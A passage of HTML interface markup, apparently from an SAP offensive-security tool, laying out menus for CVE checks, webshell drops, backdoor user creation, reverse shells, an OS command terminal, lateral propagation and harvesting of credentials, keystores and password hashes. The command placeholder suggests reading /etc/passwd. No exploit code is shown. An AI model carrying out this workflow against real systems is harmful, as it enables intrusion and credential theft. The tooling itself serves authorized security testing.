      <div class="ctx-item" data-action="check_gw">&#128270; Check GW Vulnerability</div>
      <div class="ctx-item" data-action="check_ms">&#128270; Check MS Betrusted (CVE-2020-6207)</div>
      <div class="ctx-item" data-action="check_cve_31324">&#128270; Check CVE-2025-31324 (Java VisualComposer)</div>
      <div class="ctx-item" data-action="check_cve_6287">&#128270; Check CVE-2020-6287 (RECON)</div>
      <div class="ctx-item" data-action="check_linux_lpe">&#128275; Check Linux Root LPE (Copy Fail / Dirty Frag)</div>
      <div class="ctx-item" data-action="deep_scan">&#128260; Deep Scan (full SAPology)</div>
      <div class="ctx-item" data-action="retrieve_rfcs">&#128225; Retrieve RFC Connections</div>
      <div class="ctx-item" data-action="read_java_destinations">&#128225; Read Java JCo Destinations</div>
      <div class="ctx-item" data-action="test_rfcs">&#129514; Test RFC Connections</div>
      <div class="ctx-item" data-action="enum_clients">&#128202; Enumerate Clients</div>
      <div class="ctx-item" data-action="client_roles">&#128202; Retrieve Client Roles</div>
      <div class="ctx-item" data-action="default_creds">&#9888; Check Default Accounts</div>
      <div class="ctx-item" data-action="check_router_info">&#128268; Check SAProuter Info Leak</div>
      <div class="ctx-item" data-action="router_scan">&#128270; Scan Internally via SAProuter</div>
    </div>
  </div>
  <!-- Exploitation submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#9876; Exploitation</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="lpe">&#128274; ABAP Local Privilege Escalation</div>
      <div class="ctx-item" data-action="exploit_linux_lpe">&#9889; Escalate to Root (auto: Copy Fail / Dirty Frag)</div>
      <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
      <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
      <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
      <div class="ctx-item" data-action="exploit_cve_31324_drop">&#128272; Drop JSP Webshell (CVE-2025-31324)</div>
      <div class="ctx-item" data-action="create_user_gw">&#128100; Create User (GW Exploit)</div>
      <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
      <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
      <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
      <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
      <div class="ctx-item" data-action="harvest_btp_creds">&#9729; Harvest BTP Credentials (lateral to cloud)</div>
    </div>
  </div>
  <!-- Cloud Connector submenu (visible only when SCC is on same host) -->
  <div class="ctx-group" id="ctx-scc-group">
    <div class="ctx-item">&#9889; Cloud Connector</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="scc_via_sap_set_credentials">&#128273; Set SCC Credentials</div>
      <div class="ctx-item" data-action="scc_via_sap_probe_creds">&#128273; Probe Default Account (Administrator/manage)</div>
      <div class="ctx-item" data-action="scc_via_sap_pull_mappings">&#128194; Pull Mappings</div>
      <div class="ctx-item" data-action="scc_via_sap_probe_mappings">&#128225; Probe Mappings (TCP/HTTP smoke test)</div>
      <div class="ctx-item" data-action="scc_via_sap_extract_keystore" style="color:#f85149">&#128272; Extract Keystore + Decrypt SSFS (CROWN JEWELS)</div>
      <div class="ctx-item" data-action="scc_via_sap_download_hashes">&#128196; Harvest SCC Password Hashes</div>
      <div class="ctx-sep"></div>
      <div class="ctx-item" data-action="harvest_scc">&#9928; Harvest SCC Files (post-RCE)</div>
      <div class="ctx-item" data-action="harvest_scc_mappings">&#128194; Harvest SCC Mappings (OS-exec)</div>
      <div class="ctx-item" data-action="harvest_scc_ssfs">&#128273; Decrypt On-Host SSFS (Recover Secrets)</div>
    </div>
  </div>
  <!-- Data Extraction submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128230; Data Extraction</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="download_hashes">&#128273; Extract Hashes for Cracking</div>
      <div class="ctx-item" data-action="download_secstore">&#128273; Download SecStore (RSECTAB)</div>
      <div class="ctx-item" data-action="download_java_secstore">&#128273; Download Java Secure Store</div>
      <div class="ctx-item" data-action="view_java_secstore">&#128203; View Java Secure Store Results</div>
      <div class="ctx-item" data-action="download_table">&#128229; Download Table Data</div>
    </div>
  </div>
  <!-- Business Impact submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128200; Business Impact</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="impact_assess">&#128200; Run ABAP Impact Scenarios</div>
      <div class="ctx-item" data-action="impact_assess_java">&#128200; Run Java Impact Scenarios</div>
      <div class="ctx-item" data-action="impact_view">&#128202; View Impact Results</div>
    </div>
  </div>
  <!-- Cleanup submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#128465; Cleanup</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="cleanup">&#128465; Delete SAPMAP00 User</div>
    </div>
  </div>
  <div class="ctx-sep"></div>
  <!-- Settings submenu -->
  <div class="ctx-group">
    <div class="ctx-item">&#9881; Settings</div>
    <div class="ctx-sub">
      <div class="ctx-item" data-action="set_type">&#9881; Set System Type</div>
      <div class="ctx-item" data-action="set_db_type">&#9881; Set DB Type</div>
      <div class="ctx-item" data-action="set_os_type">&#9881; Set OS Type</div>
      <div class="ctx-item" data-action="set_instance_nr">&#9881; Set Instance Number</div>
      <div class="ctx-item" data-action="set_saprouter">&#128268; Set SAProuter</div>
      <div class="ctx-item" data-action="set_telnet_override">&#128279; Set Telnet Endpoint (SSH tunnel)</div>
    </div>
  </div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="delete_system" style="color:#f85149">&#128465; Delete System from Map</div>
</div>

<!-- Map Background Context Menu -->
<div class="ctx-menu" id="map-ctx-menu">
  <div class="ctx-item" data-action="map_add_system">&#10133; Add System Manually</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="map_propagate_all">&#128640; Auto-Propagate All</div>
  <div class="ctx-item" data-action="map_cleanup_all">&#129529; Cleanup All Users</div>
  <div class="ctx-item" data-action="map_scan_all_vulns" style="color:#f0883e">&#128270; Scan for All Vulnerabilities</div>
  <div class="ctx-item" id="map-ctx-check-all-gw" data-action="map_check_all_gw">&#128272; Check All GW Vulnerabilities</div>
  <div class="ctx-item" data-action="map_check_all_betrusted">&#128272; Check All 10KBlaze (MS Betrusted)</div>
  <div class="ctx-item" data-action="map_analyze_chains">&#128279; Analyze Trust Chains</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="map_fit">&#128208; Fit to Window</div>
  <div class="ctx-item" data-action="map_reset_layout">&#128260; Reset Layout</div>
</div>

<!-- SAP Cloud Connector Context Menu -->
<div class="ctx-menu" id="scc-ctx-menu">
  <div class="ctx-item" data-action="scc_details">&#128269; View SCC Details</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="scc_set_credentials">&#128273; Set Credentials</div>
  <div class="ctx-item" data-action="scc_probe_creds">&#128273; Probe Default Account (Administrator/manage)</div>
  <div class="ctx-item" data-action="scc_pull_mappings">&#128194; Pull Mappings</div>
  <div class="ctx-item" data-action="scc_probe_mappings">&#128225; Probe Mappings (TCP/HTTP smoke test)</div>
  <div class="ctx-item" data-action="scc_extract_keystore" style="color:#f85149">&#128272; Extract Keystore + Decrypt SSFS (FULL BACKUP — CROWN JEWELS)</div>
  <div class="ctx-item" data-action="scc_download_hashes">&#128196; Download Password Hashes</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="scc_delete" style="color:#f85149">&#128465; Remove from Map</div>
</div>

<!-- BTP Subaccount Context Menu -->
<div class="ctx-menu" id="btp-ctx-menu">
  <div class="ctx-item" data-action="btp_details">&#128269; View Subaccount Details</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="btp_pull_destinations">&#128229; Refresh Destinations</div>
  <div class="ctx-item" data-action="btp_highlight_links">&#128279; Highlight Linked On-prem Targets</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="btp_copy_uuid">&#128203; Copy Subaccount UUID</div>
  <div class="ctx-item" data-action="btp_copy_subdomain">&#128203; Copy Subdomain</div>
  <div class="ctx-item" data-action="btp_copy_region">&#128203; Copy Region</div>
  <div class="ctx-sep"></div>
  <div class="ctx-item" data-action="btp_remove" style="color:#f85149">&#128465; Remove from Map</div>
</div>

<!-- Connection Info Panel -->
<div class="info-panel" id="info-panel"></div>
<div id="toast-stack" style="position:fixed;right:16px;bottom:16px;z-index:2000;
     display:flex;flex-direction:column-reverse;gap:8px;pointer-events:none"></div>

<!-- System Detail Panel -->
<div class="detail-panel" id="detail-panel"></div>

<!-- Credentials Modal -->
<div class="modal-overlay" id="cred-modal">
  <div class="modal">
    <h3>&#128273; Provide Credentials</h3>
    <div id="cred-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Instance Number</label>
      <input type="text" id="cred-instance" placeholder="00" style="width:60px">
      <span id="cred-instance-hint" style="font-size:10px;color:#484f58;margin-left:8px"></span>
    </div>
    <div class="form-row">
      <label>Client</label>
      <input type="text" id="cred-client" placeholder="100">
    </div>
    <div class="form-row">
      <label>Username</label>
      <input type="text" id="cred-user" placeholder="">
    </div>
    <div class="form-row">
      <label>Password</label>
      <input type="password" id="cred-pass" placeholder="">
    </div>
    <div class="form-actions">
      <button class="btn" onclick="testCredentials()">Test Connection</button>
      <button class="btn btn-primary" onclick="saveCredentials()">Save &amp; Use</button>
      <button class="btn" onclick="closeModal('cred-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SCC Credentials Modal -->
<div class="modal-overlay" id="scc-cred-modal">
  <div class="modal">
    <h3>&#128273; SCC Credentials</h3>
    <div id="scc-cred-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Username</label>
      <input type="text" id="scc-cred-user" placeholder="Administrator">
    </div>
    <div class="form-row">
      <label>Password</label>
      <input type="password" id="scc-cred-pass" placeholder="">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSCCCredentials()">Save</button>
      <button class="btn" onclick="closeModal('scc-cred-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SCC Password Hashes Modal -->
<div class="modal-overlay" id="scc-hashes-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#128196; SCC Password Hashes</h3>
    <div id="scc-hashes-source" style="font-size:11px;color:#8b949e;margin-bottom:10px"></div>
    <div id="scc-hashes-table" style="overflow-x:auto;margin-bottom:12px"></div>
    <div id="scc-hashes-cmds" style="margin-bottom:12px"></div>
    <div id="scc-hashes-online-results" style="margin-top:8px"></div>
    <div style="font-size:11px;color:#8b949e;margin-top:10px;display:flex;align-items:center;gap:6px">
      <input type="checkbox" id="hashes-auto-lookup-cb" onchange="setAutoLookupHashes(this.checked)" style="margin:0">
      <label for="hashes-auto-lookup-cb" style="cursor:pointer">
        Auto-lookup on hashes.com after each extract (when API key is set)
      </label>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="sccHashesCopy()">Copy Hashes</button>
      <button class="btn" id="hashes-lookup-btn" onclick="sccLookupHashesOnline()">&#128269; Lookup on hashes.com</button>
      <button class="btn" onclick="closeModal('scc-hashes-modal')">Close</button>
    </div>
  </div>
</div>

<!-- BTP Token Paste Modal -->
<div class="modal-overlay" id="btp-token-modal">
  <div class="modal" style="max-width:720px;width:95vw">
    <h3>&#9729;&#65039; SAP BTP — Paste cf oauth-token</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Paste the output of <code>cf oauth-token</code> (a JWT starting
      with <code>eyJ</code>).  SAPMAP decodes the token offline to learn
      its region + identity, stores it in process memory only (NEVER
      written to disk), and exposes BTP enumeration actions
      (subaccounts, SCC mappings, destinations with cleartext capture).
      <br><br>
      <b>Operational guard-rails:</b> rate-limit 1 req/100 ms with hard
      cap of 200 req/min.  Every outbound BTP API call is logged to the
      console with the token's fingerprint.  Token wiped on process exit.
    </div>
    <div class="form-row">
      <label>cf oauth-token (JWT)</label>
      <textarea id="btp-token-input" rows="3" placeholder="eyJhbGciOiJSUzI1NiIs..."
                style="width:100%;font-family:monospace;font-size:11px"></textarea>
    </div>
    <div id="btp-token-status" style="margin-top:10px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="btpStoreToken()">Store + validate</button>
      <button class="btn" onclick="btpClearTokens()">Clear all stored tokens</button>
      <button class="btn" onclick="closeModal('btp-token-modal')">Close</button>
    </div>
  </div>
</div>

<!-- BTP Subaccount drawer (right side) — shown via showBtpSubaccount() -->
<div class="modal-overlay" id="btp-sub-modal">
  <div class="modal" style="max-width:860px;width:95vw">
    <h3 id="btp-sub-title">&#9729;&#65039; BTP Subaccount</h3>
    <div id="btp-sub-meta" style="font-size:11px;color:#8b949e;margin-bottom:12px"></div>
    <div id="btp-sub-actions" style="margin-bottom:14px"></div>
    <div id="btp-sub-destinations"></div>
    <div class="form-actions">
      <button class="btn" onclick="closeModal('btp-sub-modal')">Close</button>
    </div>
  </div>
</div>

<!-- Diff Two Runs Modal -->
<div class="modal-overlay" id="diff-modal">
  <div class="modal" style="max-width:680px;width:95vw">
    <h3>&#128202; Diff Two Runs</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Compare two engagement snapshots — saved <code>.sapmap</code>
      files in the <code>states/</code> folder, or your live in-memory
      state.  Output: a self-contained HTML diff under
      <code>loot/reports/</code> showing what changed (new pwns, new
      findings, new attack paths to PRD, removed findings, etc.).
    </div>
    <div class="form-row">
      <label>Baseline (older run)</label>
      <select id="diff-baseline" style="width:100%"></select>
    </div>
    <div class="form-row">
      <label>Current (newer run)</label>
      <select id="diff-current" style="width:100%"></select>
    </div>
    <div id="diff-result" style="margin-top:12px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="runDiffCompute()">Compare</button>
      <button class="btn" onclick="closeModal('diff-modal')">Close</button>
    </div>
  </div>
</div>

<!-- hashes.com API Key Modal -->
<div class="modal-overlay" id="hashes-api-modal">
  <div class="modal" style="max-width:480px">
    <h3>&#128273; hashes.com API Key</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Get a free API key at <a href="https://hashes.com" target="_blank" style="color:#58a6ff">hashes.com</a>.
      Stored locally in <code>settings.local.json</code> (gitignored, never pushed).
    </div>
    <div class="form-row">
      <label>API Key</label>
      <input type="password" id="hashes-api-key-input" placeholder="paste key here" autocomplete="off">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveHashesApiKey()">Save</button>
      <button class="btn" onclick="closeModal('hashes-api-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Table Download Modal -->
<div class="modal-overlay" id="table-modal">
  <div class="modal">
    <h3>&#128229; Download Table Data</h3>
    <div class="form-row">
      <label>Table Name</label>
      <input type="text" id="tbl-name" placeholder="e.g. USR02, T000">
    </div>
    <div class="form-row">
      <label>Fields (comma-separated, empty=all)</label>
      <input type="text" id="tbl-fields" placeholder="MANDT,BNAME,BCODE">
    </div>
    <div class="form-row">
      <label>WHERE Clause (optional)</label>
      <input type="text" id="tbl-where" placeholder="e.g. BNAME = 'DDIC'">
    </div>
    <div class="form-row">
      <label>Max Rows</label>
      <input type="number" id="tbl-maxrows" value="500">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="downloadTable()">Download</button>
      <button class="btn" onclick="closeModal('table-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set System Type Modal -->
<div class="modal-overlay" id="type-modal">
  <div class="modal">
    <h3>&#9881; Set System Type</h3>
    <div id="type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>System Type</label>
      <select id="type-select">
        <option value="" disabled selected hidden>Select type...</option>
        <option value="ABAP">ABAP</option>
        <option value="JAVA">Java</option>
        <option value="ABAP+JAVA">ABAP+Java</option>
        <option value="BUSINESSOBJECTS">BusinessObjects</option>
        <option value="CLOUD_CONNECTOR">Cloud Connector</option>
        <option value="CONTENT_SERVER">Content Server</option>
        <option value="SAPROUTER">SAPRouter</option>
        <option value="MDM">MDM</option>
        <option value="HANA">HANA</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSystemType()">Save</button>
      <button class="btn" onclick="closeModal('type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set DB Type Modal -->
<div class="modal-overlay" id="db-type-modal">
  <div class="modal">
    <h3>&#9881; Set DB Type</h3>
    <div id="db-type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Database Type</label>
      <select id="db-type-select">
        <option value="" disabled selected hidden>Select DB type...</option>
        <option value="HDB">HANA (HDB)</option>
        <option value="ADA">MaxDB / ADABAS D (ADA)</option>
        <option value="ORA">Oracle (ORA)</option>
        <option value="MSS">MS SQL Server (MSS)</option>
        <option value="DB6">DB2 (DB6)</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveDbType()">Save</button>
      <button class="btn" onclick="closeModal('db-type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set OS Type Modal -->
<div class="modal-overlay" id="os-type-modal">
  <div class="modal">
    <h3>&#9881; Set OS Type</h3>
    <div id="os-type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Operating System</label>
      <select id="os-type-select">
        <option value="" disabled selected hidden>Select OS type...</option>
        <option value="Linux">Linux</option>
        <option value="Windows">Windows</option>
        <option value="AIX">AIX</option>
        <option value="HP-UX">HP-UX</option>
        <option value="SunOS">SunOS / Solaris</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveOsType()">Save</button>
      <button class="btn" onclick="closeModal('os-type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set Instance Number Modal -->
<div class="modal-overlay" id="instance-nr-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();saveInstanceNr();}">
    <h3>&#9881; Set Instance Number</h3>
    <div id="instance-nr-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Instance Number (00-97)</label>
      <input type="text" id="instance-nr-input" maxlength="2" placeholder="00" style="width:80px;text-align:center;font-family:monospace">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Two-digit SAP instance number. Drives derived ports (32NN dispatcher, 33NN gateway, 36NN MS, 81NN ICM, 50NN+ Java) used by RFC and exploit actions.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveInstanceNr()">Save</button>
      <button class="btn" onclick="closeModal('instance-nr-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set SAProuter Modal -->
<div class="modal-overlay" id="saprouter-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();saveSaprouter();}">
    <h3>&#128268; Set SAProuter</h3>
    <div id="saprouter-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>SAProuter String</label>
      <input type="text" id="saprouter-input" placeholder="/H/router_ip/S/3299/W/password" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Route prefix to reach this system. Leave empty to remove SAProuter. All RFC and GW connections will route through this.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSaprouter()">Save</button>
      <button class="btn" onclick="closeModal('saprouter-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SAProuter Internal Scan Modal -->
<div class="modal-overlay" id="router-scan-modal">
  <div class="modal">
    <h3>&#128270; Scan Internally via SAProuter</h3>
    <div id="router-scan-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target IP Range</label>
      <input type="text" id="router-scan-targets" placeholder="e.g. 192.168.2.0/24 or 192.168.2.1,192.168.2.2" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">
        CIDR, single IP, or comma-separated list.
        Leave empty to use IPs from the Router Info Leak.
      </span>
    </div>
    <div id="router-scan-autotargets-row" style="display:none" class="form-row">
      <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
        <input type="checkbox" id="router-scan-auto" checked style="width:auto">
        Also include IPs from Router Info Leak
        <span id="router-scan-auto-count" style="color:#3fb950;font-size:11px"></span>
      </label>
    </div>
    <div style="display:flex;gap:12px">
      <div class="form-row" style="flex:1">
        <label>Instance range</label>
        <div style="display:flex;align-items:center;gap:6px">
          <input type="number" id="router-scan-inst-from" value="0" min="0" max="99" style="width:52px">
          <span style="color:#484f58">–</span>
          <input type="number" id="router-scan-inst-to" value="10" min="0" max="99" style="width:52px">
        </div>
        <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">SAP instances NN to scan (e.g. 0–10 probes ports 3200–3210, 3300–3310)</span>
      </div>
      <div class="form-row" style="flex:1">
        <label>Mode</label>
        <select id="router-scan-mode" style="width:100%">
          <option value="sap" selected>SAP (dispatcher + gateway + sapcontrol)</option>
          <option value="full">Full (+ HANA SQL + Java)</option>
        </select>
      </div>
    </div>
    <div style="display:flex;gap:12px">
      <div class="form-row" style="flex:1">
        <label>Concurrency</label>
        <input type="number" id="router-scan-concurrency" value="10" min="1" max="50" style="width:60px">
        <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Simultaneous probes per host. Keep ≤10 to avoid flooding the SAProuter.</span>
      </div>
      <div class="form-row" style="flex:1">
        <label>Probe timeout (s)</label>
        <input type="number" id="router-scan-timeout" value="5" min="1" max="30" style="width:60px">
      </div>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="startRouterScan()">&#128270; Start Scan</button>
      <button class="btn" onclick="closeModal('router-scan-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Add System Modal -->
<div class="modal-overlay" id="add-system-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();addSystem();}">
    <h3>&#10133; Add System Manually</h3>
    <div class="form-row">
      <label>SID (3 letters)</label>
      <input type="text" id="add-sid" placeholder="e.g. PRD" maxlength="3" style="width:80px;text-transform:uppercase">
    </div>
    <div class="form-row">
      <label>IP / Hostname</label>
      <input type="text" id="add-ip" placeholder="e.g. 10.0.1.50 or sapserver">
    </div>
    <div class="form-row">
      <label>Instance Number (2 digits)</label>
      <input type="text" id="add-instance" placeholder="00" maxlength="2" style="width:60px">
    </div>
    <div class="form-row">
      <label>SAProuter String (optional)</label>
      <input type="text" id="add-saprouter" placeholder="/H/router_ip/S/3299/W/password" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Route prefix to reach this system via SAProuter. Target host/port are appended automatically.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="addSystem()">Add System</button>
      <button class="btn" onclick="closeModal('add-system-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set Default Password Modal -->
<div class="modal-overlay" id="password-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();setDefaultPassword();}">
    <h3>&#128273; Set Default Password</h3>
    <p style="font-size:12px;color:#8b949e;margin-bottom:12px">
      This password is used when creating SAPMAP00 users on target systems (via BAPI, GW exploit, or SXPG).
      Change takes effect immediately for this session.
    </p>
    <div class="form-row">
      <label>Current Password</label>
      <input type="text" id="pwd-current" readonly style="color:#484f58;background:#161b22">
    </div>
    <div class="form-row">
      <label>New Password</label>
      <input type="text" id="pwd-new" placeholder="Enter new password">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="setDefaultPassword()">Set Password</button>
      <button class="btn" onclick="closeModal('password-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- TCP/IP Destination Modal -->
<div class="modal-overlay" id="tcpip-modal">
  <div class="modal">
    <h3>&#128279; Create TCP/IP Destination (sapxpg)</h3>
    <div id="tcpip-source-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target System</label>
      <select id="tcpip-target"></select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="createTcpipDest()">Create</button>
      <button class="btn" onclick="closeModal('tcpip-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Propagate Target Picker Modal -->
<div class="modal-overlay" id="propagate-modal">
  <div class="modal">
    <h3>&#128640; Propagate to Next Hop</h3>
    <div id="propagate-source-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target System</label>
      <select id="propagate-target"></select>
    </div>
    <div id="propagate-hint" style="font-size:11px;color:#8b949e;margin-top:4px"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="doPropagateTarget()">Propagate</button>
      <button class="btn" onclick="closeModal('propagate-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- OS Command Terminal Modal -->
<div class="modal-overlay" id="terminal-modal">
  <div class="modal shell-window" id="term-window">
    <div class="shell-titlebar" id="term-titlebar">
      <h3 style="margin:0">&#128187; OS Command Terminal — <span id="term-sid"></span></h3>
    </div>
    <div style="flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column">
    <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="term-info"></div>
    <div class="form-row" style="display:flex;gap:8px;align-items:flex-end;flex-shrink:0">
      <div style="flex:1">
        <label>Method</label>
        <select id="term-method" style="width:100%">
          <option value="gateway">Gateway (unauthenticated)</option>
          <option value="sxpg">SXPG (via SAP_ALL user)</option>
          <option value="cve_31324">CVE-2025-31324 (Java unauth)</option>
        </select>
      </div>
      <div style="flex:3">
        <label>Command</label>
        <input type="text" id="term-cmdline" placeholder="e.g. whoami, ls -la /tmp, cat /etc/passwd" style="width:100%;font-family:monospace"
               autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false"
               onkeydown="if(event.key==='Enter'){event.preventDefault();termExec();}">
      </div>
      <button class="btn btn-primary" onclick="termExec()" style="white-space:nowrap">Run</button>
    </div>
    <div id="term-output" style="background:#010409;border:1px solid #30363d;border-radius:4px;
      padding:8px;margin-top:8px;font-family:monospace;font-size:12px;color:#7ee787;
      min-height:120px;flex:1;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
      user-select:text;-webkit-user-select:text;cursor:text">
      Ready. Enter a command above and click Run.
    </div>
    <div class="form-actions" style="margin-top:8px;flex-shrink:0">
      <button class="btn" onclick="document.getElementById('term-output').textContent=''">Clear</button>
      <button class="btn" onclick="closeModal('terminal-modal')">Close</button>
    </div>
    </div>
    <div class="shell-resize-handle" id="term-resize-handle"></div>
  </div>
</div>

<!-- Java Secure Store Results Modal — draggable + resizable -->
<div class="modal-overlay" id="jss-modal">
  <div class="modal shell-window" id="jss-window" style="width:1100px;height:640px">
    <div class="shell-titlebar" id="jss-titlebar">
      <h3 style="margin:0">&#128273; Java Secure Store &mdash; <span id="jss-sid"></span></h3>
    </div>
    <div style="flex:1;overflow:hidden;padding:12px;display:flex;flex-direction:column">
      <div id="jss-meta" style="font-size:11px;color:#8b949e;margin-bottom:8px"></div>
      <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;flex-shrink:0">
        <input type="text" id="jss-filter" placeholder="filter by name, value, destination name, user, target SID/client..." style="flex:1" oninput="renderJssTable()">
        <label style="font-size:11px;color:#8b949e">
          <input type="checkbox" id="jss-showpw" onchange="renderJssTable()" checked> Show passwords
        </label>
        <label style="font-size:11px;color:#8b949e" title="Framework-internal noise: #~childInstance.N, #~data-source-aliases.xml, #~Secured Property*, and rows whose decrypt was refused (kind=undecryptable).  Hidden by default because they never contain user-facing secrets.">
          <input type="checkbox" id="jss-shownoise" onchange="renderJssTable()"> Show noise (childInstance, aliases.xml, Secured Property*, undecryptable)
        </label>
        <button class="btn" onclick="copyJssJson()" style="white-space:nowrap">Copy JSON</button>
      </div>
      <div style="overflow-y:scroll;overflow-x:auto;flex:1 1 0;min-height:200px;
                  border:1px solid #30363d;border-radius:4px;
                  user-select:text;-webkit-user-select:text;cursor:text;
                  scrollbar-width:auto;scrollbar-color:#484f58 #161b22">
        <table id="jss-table" style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace;
                                       user-select:text;-webkit-user-select:text">
          <thead style="position:sticky;top:0;background:#161b22;z-index:1">
            <tr style="color:#8b949e;border-bottom:1px solid #30363d">
              <th style="text-align:left;padding:6px 8px">Source</th>
              <th style="text-align:left;padding:6px 8px">Kind</th>
              <th style="text-align:left;padding:6px 8px">Belongs to</th>
              <th style="text-align:left;padding:6px 8px">Name</th>
              <th style="text-align:left;padding:6px 8px">Value</th>
              <th style="width:80px;padding:6px 8px"></th>
            </tr>
          </thead>
          <tbody id="jss-tbody"></tbody>
        </table>
      </div>
      <div class="form-actions" style="margin-top:8px;flex-shrink:0">
        <button class="btn" onclick="closeModal('jss-modal')">Close</button>
      </div>
    </div>
    <div class="shell-resize-handle" id="jss-resize-handle"></div>
  </div>
</div>

<!-- Reverse Shell Modal -->
<div class="modal-overlay" id="shell-modal">
  <div class="modal shell-window" id="shell-window">
    <div class="shell-titlebar" id="shell-titlebar">
      <h3 style="margin:0">&#128279; Shell — <span id="shell-sid"></span></h3>
    </div>
    <div style="flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column">
    <div id="shell-config">
      <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="shell-info"></div>
      <div style="display:flex;gap:8px;margin-bottom:8px">
        <div style="flex:1">
          <label style="font-size:11px;color:#8b949e">Execution Method</label>
          <select id="shell-method" style="width:100%">
            <option value="gateway">Gateway (unauthenticated)</option>
            <option value="sxpg">SXPG (via SAP_ALL user)</option>
